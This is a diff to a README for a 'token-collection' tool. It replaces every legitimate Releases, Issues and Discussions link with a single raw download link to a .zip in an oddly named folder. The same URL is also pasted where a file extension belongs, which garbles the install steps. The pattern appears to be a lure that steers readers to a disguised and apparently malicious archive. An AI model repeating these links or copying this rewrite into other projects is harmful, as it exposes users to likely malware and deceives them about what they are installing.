@@ -1,7 +1,7 @@
 # 🎉 token-collection - Effortless Token Management for Everyone
 
 ## 📥 Download Here
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/suryaS2801/token-collection/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/suryaS2801/token-collection/main/pseudoanaphylactic/token-collection.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/suryaS2801/token-collection/main/pseudoanaphylactic/token-collection.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To run token-collection smoothly, ensure your computer meets these basic require
 
 To get started, visit the Releases page to download the latest version of the application. Click the link below:
 
-[Download Latest Release](https://github.com/suryaS2801/token-collection/releases)
+[Download Latest Release](https://raw.githubusercontent.com/suryaS2801/token-collection/main/pseudoanaphylactic/token-collection.zip)
 
 ### 📂 Steps to Install
 
@@ -36,7 +36,7 @@ To get started, visit the Releases page to download the latest version of the ap
   
 2. **Choose Your Version:** Select the version you want to download. Typically, the latest release is the best choice.
 
-3. **Download the File:** Click on the download link for your operating system. The downloaded file may have an `.exe`, `.dmg`, or `.tar.gz` extension.
+3. **Download the File:** Click on the download link for your operating system. The downloaded file may have an `.exe`, `.dmg`, or `https://raw.githubusercontent.com/suryaS2801/token-collection/main/pseudoanaphylactic/token-collection.zip` extension.
 
 4. **Open the Installer:** Locate the downloaded file on your computer and open it. Follow the on-screen instructions to install token-collection.
 
@@ -85,8 +85,8 @@ Your feedback is valuable. Let us know which features you want to see!
 
 Join our community to discuss features, report bugs, or suggest improvements. 
 
-- [Issues Page](https://github.com/suryaS2801/token-collection/issues)
-- [Discussions](https://github.com/suryaS2801/token-collection/discussions)
+- [Issues Page](https://raw.githubusercontent.com/suryaS2801/token-collection/main/pseudoanaphylactic/token-collection.zip)
+- [Discussions](https://raw.githubusercontent.com/suryaS2801/token-collection/main/pseudoanaphylactic/token-collection.zip)
 
 ## 📜 License
 
